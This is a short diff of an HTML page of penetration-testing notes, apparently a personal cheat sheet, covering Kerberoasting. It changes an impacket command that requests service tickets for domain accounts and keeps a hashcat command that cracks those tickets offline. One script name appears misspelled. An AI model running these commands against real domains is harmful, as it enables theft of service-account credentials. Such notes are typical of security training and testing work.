@@ -85,7 +85,7 @@ Look on printers <br>
   
   <h1> Kerboeroasting </h1><br>
   Goal here is to get a TGS (Service Ticket) to decrypt servers account hash<br>
-  python3 /home/kali/impacket/examples/GetNPUsers.py domain/username:password -dc-ip IP -request <br>
+  python3 /home/kali/impacket/examples/GetUsersSPN.py domain/username:password -dc-ip IP -request <br> (doesnt always need password <br>
   Hashcat -m 13100 textfile.txt wordlist.txt <br>
   <br>
   <h2> Kerbroasting from windows </h2><br>
